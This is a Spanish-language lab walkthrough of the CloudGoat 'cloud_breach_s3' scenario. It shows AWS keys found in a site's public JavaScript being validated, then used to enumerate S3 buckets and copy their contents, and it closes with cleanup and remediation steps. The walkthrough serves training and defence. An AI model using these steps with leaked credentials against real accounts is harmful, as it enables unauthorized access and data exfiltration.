# Paso a paso · `cloud_breach_s3`

> Valores genéricos: `<BUCKET>`, `<CUENTA>`, `<USUARIO>`. Las credenciales y las flags no se incluyen en el repositorio.
> Ejecutar solo contra el entorno de laboratorio propio.

## 1. Reconocimiento del lado cliente
Revisar, con Burp Suite o las herramientas de desarrollo del navegador, los archivos JavaScript que
carga el sitio. En este escenario, un script accesible públicamente contenía credenciales de AWS
(Access Key, Secret Key, nombre del bucket y región).

> Lección: cualquier secreto que llegue al navegador se considera comprometido.

## 2. Validar las credenciales expuestas
```bash
aws configure --profile eval        # Con la Access Key / Secret encontradas · región y json
aws sts get-caller-identity --profile eval
# Confirma el usuario IAM y el ID de cuenta -> credenciales válidas
```

## 3. Acceso y enumeración del bucket S3
```bash
aws s3 ls --profile eval                          # Lista los buckets accesibles
aws s3 ls s3://<BUCKET>/ --profile eval           # Contenido del bucket
aws s3 ls s3://<BUCKET>/ --recursive --profile eval   # Enumeración recursiva
```

## 4. Descarga de archivos (demostración de impacto)
```bash
aws s3 cp s3://<BUCKET>/<ruta>/ ./descargas/ --recursive --profile eval
# Entre los archivos: configuraciones, PDFs internos y archivos de texto sensibles.
```

## 5. Reproducción del escenario con CloudGoat
```bash
./cloudgoat.py list
./cloudgoat.py create cloud_breach_s3
aws sts get-caller-identity --profile eval
aws configure list-profiles
```

## 6. Limpieza
```bash
./cloudgoat.py destroy cloud_breach_s3
```

## Remediación verificable
- Rotar la clave expuesta y quitarla del código cliente.
- `aws s3api put-public-access-block --bucket <BUCKET> --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true`
- Revisar la política IAM del usuario y acotarla a lo mínimo necesario.
